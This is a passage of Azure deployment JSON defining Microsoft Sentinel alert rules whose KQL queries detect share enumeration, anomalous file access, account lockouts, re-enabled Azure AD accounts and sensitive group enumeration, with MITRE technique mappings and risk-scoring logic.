          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nlet EventIDList = dynamic([5140, 4663]);\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet threshold = coalesce(toint(BV1508_CONFIG['OBJECT_THRESHOLD']), toint(global_config['OBJECT_THRESHOLD']),1);      \nlet exclusions = array_concat(global_config['EXCLUSION'], BV1508_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1508_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};    \nSecurityEvent\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n//| where ShareName !endswith 'C$' and ShareName !endswith 'ADMIN$'\n| where isnotempty(ShareName)\n| project \n    bv_user = SubjectUserName\n    , bv_user_id = SubjectUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_authentication_action = 'login'\n    , bv_authentication_protocol = 'rdp'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_src_ip = IpAddress\n    , bv_alert_time = now()\n    , bv_object = ShareName\n    , bv_object_category = 'file'\n    , bv_change_action = case(AccessMask in ('0x1', '0x8', '0x80'), 'access'\n                            , AccessMask in ('0x2', '0x10', '0x100'), 'write'\n                            , AccessMask == '0x4', 'modify'\n                            , AccessMask in ('0x40', '0x10000'), 'delete'\n                            , '')\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count(), bv_object = make_set(bv_object, 10), bv_object_cnt = dcount(bv_object), bv_src_ip_cnt = dcount(bv_src_ip), bv_src_ip = make_set(bv_src_ip, 10) by bv_user\n| where bv_object_cnt >= threshold\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1508')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_user, bv_src_ip)\n| extend bv_alarm_attacker_entities = pack_array(bv_user, bv_src_ip)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription    ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "LateralMovement",
            "Execution",
            "Discovery"
          ],
          "techniques": [
            "T1039",
            "T1021",
            "T1569",
            "T1135"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account",
                "IP",
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts when a user enumerates a high number of network shares. Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\n\n{{ExtendedDescription}}\n\nMITRE: T1039 MITRE: T1021 MITRE: T1569 MITRE: T1135\nCategory: Windows Security\n\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1509')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1509')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1509: [RBA] Windows - Anomalous Number Of Files Access",
          "description": "This alerts when an anomalous number of files are accessed from a given platform which may indicate data exfiltration or malicious file crawling activities. MITRE: T1039,T1135,T1213 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic([5145]);\nlet latency = 0d;\nlet start_time = 1d;\nlet end_time = now();\nlet alert_bin = 1d;\nlet start_time_historical = 14d;\nlet Historical_Events = \nSecurityEvent\n|where TimeGenerated between (ago(start_time_historical) .. ago(start_time))\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith '$'\n| summarize Count=count() by SubjectUserName, Computer, bin_at(TimeGenerated, alert_bin, now())\n| summarize percentiles(Count,25,50,75,100) by SubjectUserName, Computer\n//My Deviation is a delta between the candle stick body.\n| extend MyDev = (percentile_Count_75 - percentile_Count_25)*1.0\n| where MyDev > 0\n| extend MyVar = MyDev / percentile_Count_100 //My Variance is a percentage of My Deviation from the max value\n| extend MyVarDev = MyDev * MyVar //Multiply My Deviation by My Variance so as to soften it for the final outlier calculation\n| extend GreaterThanThis = percentile_Count_100 + MyVarDev;\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith '$'\n| summarize bv_event_count = count() by SubjectUserName, bv_dest_dvc = Computer, bin_at(TimeGenerated, alert_bin, now())\n| where bv_event_count > 50\n| join kind=leftouter Historical_Events on SubjectUserName\n| extend bv_src_user = SubjectUserName\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| extend Delta = bv_event_count - GreaterThanThis\n| where Delta > 0\n| extend bv_expected_max = GreaterThanThis\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', TimeGenerated\n    ,'\\nbv_src_user: ', bv_src_user\n    ,'\\nbv_dest_dvc: ', bv_dest_dvc\n    ,'\\nbv_expected_max: ', bv_expected_max \n    ,'\\nbv_event_count: ', bv_event_count)\n| extend VictimEntity = array_concat(pack_array(bv_src_user), pack_array(bv_dest_dvc)), AttackerEntity = pack_array(bv_src_user)\n| project\n    bv_start_time = TimeGenerated\n    , bv_src_user\n    , bv_dest_dvc\n    , bv_event_count\n    , bv_expected_max\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore = 1\n    , ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "Discovery"
          ],
          "techniques": [
            "T1039",
            "T1135",
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account",
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts when an anomalous number of files are accessed from a given platform which may indicate data exfiltration or malicious file crawling activities.\n\n{{ExtendedDescription}}\n\nMITRE: T1039 MITRE: T1021 MITRE: T1213\nCategory: Windows Security\n\ntag: RBA"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_dest_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10580')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10580')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10580: [RBA] Windows - Locked Accounts",
          "description": "This alert identifies accounts that have been locked in the last 1 hour. This may indicate a potential brute force attack against the account. MITRE: T1531,T1110 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic([4740, 4771]);    \nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;   \nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});      \nlet exclusions = array_concat(global_config['EXCLUSION'], BV10580_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV10580_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};\nlet SourceInformation = SecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time)\n| where EventID == EventIDList[1]\n| extend IpAddress = replace_string(IpAddress, '::ffff:', '')\n| summarize SrcIpAddr = take_anyif(IpAddress, IpAddress != '-')\n          , SrcWorkStation = take_anyif(WorkstationName, WorkstationName != '-') by UserName = tolower(TargetUserName);          \nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == EventIDList[0]\n| extend UserName = tolower(TargetUserName)\n| join kind=leftouter (SourceInformation) on UserName\n| project \n    bv_user = UserName\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_raw = EventData\n    , bv_event_id = EventID\n    , bv_src_ip = SrcIpAddr\n    , bv_src_dvc_hostname = SrcWorkStation\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count(), bv_src_ip_list = make_set(bv_src_ip, 10), bv_src_dvc_hostname = make_set_if(bv_src_dvc_hostname, isnotempty(bv_src_dvc_hostname), 10) by bv_user\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-10580')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_user)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "CredentialAccess"
          ],
          "techniques": [
            "T1531",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies accounts that have been locked in the last 1 hour. This may indicate a potential brute force attack against the account.\n\n{{ExtendedDescription}}\n\nCategory: Windows Security\nMITRE: T1531 MITRE: T1110\ntag: RBA         "
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-140')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-140')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-140: [RBA] Azure AD - Accounts Previously Blocked Becoming Active",
          "description": "This alert is triggered whenever a previously Azure AD account is enabled. MITRE: T1098 Category: Entra ID tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nAuditLogs\n| where TimeGenerated between (ago(start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationName =~ 'Enable account' \n| where Result =~ 'success'\n| extend parsedInitiatedBy = parse_json(InitiatedBy) \n| extend parsedTargetResources = parse_json(TargetResources) \n| extend DestUsername = parsedTargetResources[0].userPrincipalName\n| where isnotempty(DestUsername)\n| extend User_ = parsedInitiatedBy.user.userPrincipalName\n| extend App_ = coalesce(\n                parsedInitiatedBy.app.servicePrincipalName\n                , parsedInitiatedBy.app.displayName\n                , parsedInitiatedBy.app.servicePrincipalId\n                )\n| extend SrcUsername = coalesce(User_,App_)\n| where tolower(SrcUsername) matches regex tolower(AUTHORIZED_ADMINS) == false\n| where tolower(DestUsername) matches regex tolower(EXCLUDED_USER_ACCOUNTS) == false\n| parse SrcUsername with SrcUsername_ '@' *\n| parse DestUsername with DestUsername_ '@' *\n| extend SrcUsername_normalized = coalesce(SrcUsername_, SrcUsername)\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(SrcUsername_normalized))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| extend DestUsername_normalized = coalesce(DestUsername_, DestUsername)\n| summarize \n        First=min(TimeGenerated)\n        , Last=max(TimeGenerated)\n        , DestUsername=make_set(DestUsername,5)\n        , EventCount=count()\n        , SrcUsername_normalized = make_set(SrcUsername_normalized)\n        , DestUsername_normalized = make_set(DestUsername_normalized)\n    by \n        tostring(SrcUsername)\n        , bin(TimeGenerated, alert_bin)\n| extend VictimEntity = DestUsername_normalized\n| extend AttackerEntity = SrcUsername_normalized\n| extend ExtendedDescription = strcat(\n    'SrcUsername: ', SrcUsername\n    ,' \\nEventCount: ', EventCount\n    ,' \\nEnabled Accounts: \\n* ', strcat_array(DestUsername, ' \\n*')\n)\n| extend bv_rule_version = '1.1.5167'\n| extend bv_rule_timestamp = '1712943336.7960742'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5167 bv_rule_timestamp: 1712943336.7960742'\n| extend bv_alarm_rba_score = 1\n| project\n    First\n    , Last\n    , EventCount\n    , SrcUsername\n    , SrcUsername_normalized\n    , DestUsername\n    , ExtendedDescription\n    , VictimEntity\n    , AttackerEntity\n    , bv_alarm_rba_score\n    , bv_rule_combined_string",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-140: [RBA] Azure AD - {{SrcUsername}} Enabled {{EventCount}} Account(s)",
            "alertDescriptionFormat": "This alert is triggered whenever a previously Azure AD account is enabled.\n\n{{ExtendedDescription}}\n\nMITRE: T1098\nCategory: Azure AD\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SrcUsername"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1506')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1506')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1506: [RBA] Windows - Sensitive Group Enumeration",
          "description": "This alerts when a process enumerates the members of a security-enabled local group on the computer or device. MITRE: T1069 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic([4799]);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Account !endswith '$'\n| where CallerProcessName <> '-'\n| where TargetAccount has_any (BV1506_CONFIG['SENSITIVE_GROUPS'])\n| extend \n    bv_src_user             = SubjectUserName\n    , bv_src_user_id        = SubjectUserSid\n    , bv_dest_dvc           = Computer\n    , bv_process            = CallerProcessName\n    , bv_object             = TargetAccount\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| mv-apply e = BV1506_CONFIG['EXCLUSIONS'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_id_excluded = iff(bv_src_user_id contains e.bv_src_user_id and isnotempty(e.bv_src_user_id), 1, 0)\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_dest_dvc_excluded = iff(bv_dest_dvc contains e.bv_dest_dvc and isnotempty(e.bv_dest_dvc), 1, 0)\n        | extend bv_object_excluded = iff(bv_object contains e.bv_object and isnotempty(e.bv_object), 1, 0)\n        | extend bv_process_excluded = iff(bv_process contains e.bv_process and isnotempty(e.bv_process), 1, 0)\n        | extend excluded_count = \n                bv_src_user_id_excluded\n                + bv_src_user_excluded\n                + bv_dest_dvc_excluded\n                + bv_object_excluded\n                + bv_process_excluded\n        | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true) \n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where not(transparent > 0 and ExcludedEvent)\n| summarize \n        bv_start_time       = min(TimeGenerated)\n        , bv_end_time       = max(TimeGenerated)\n        , bv_event_count    = count()\n        , bv_dest_dvc       = make_set(bv_dest_dvc, 10)\n        , bv_dest_dvc_count = dcount(bv_dest_dvc)\n        , bv_object         = make_set(bv_object, 10)\n        , bv_object_count   = dcount(bv_object)\n        , bv_process        = make_set(bv_process, 10)\n    by \n        bv_src_user\n        , bv_src_user_id\n        , bin(TimeGenerated, alert_bin)\n| extend RBAScore               = iff(bv_event_count > 5 or bv_object_count > 2, 3, 1)\n| extend AttackerEntity         = pack_array(bv_src_user)\n| extend VictimEntity           = bv_dest_dvc\n| extend ExtendedDescription    = strcat(\n    'bv_src_user: ', bv_src_user\n    , '\\nbv_event_count: ',     bv_event_count\n    , '\\nbv_object_count: ',    bv_object_count\n    , '\\nbv_dest_dvc_count: ',  bv_dest_dvc_count\n    , '\\nbv_object: \\n* ',      strcat_array(bv_object, '\\n* ')\n    , '\\nbv_process: \\n* ',     strcat_array(bv_process, '\\n* ')\n    , '\\nbv_dest_dvc: \\n* ',    strcat_array(bv_dest_dvc, '\\n* ')\n)\n| project\n    bv_alert_time = now()\n    , bv_change_action      = 'access'\n    , bv_change_category    = 'group'\n    , bv_change_result      = 'success'\n    , bv_mitre_technique_id = 'T1069'\n    , bv_start_time\n    , bv_end_time\n    , bv_event_count\n    , bv_dest_dvc_count\n    , bv_dest_dvc\n    , bv_src_user\n    , bv_src_user_id\n    , bv_object_count\n    , bv_object\n    , bv_process\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1069"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
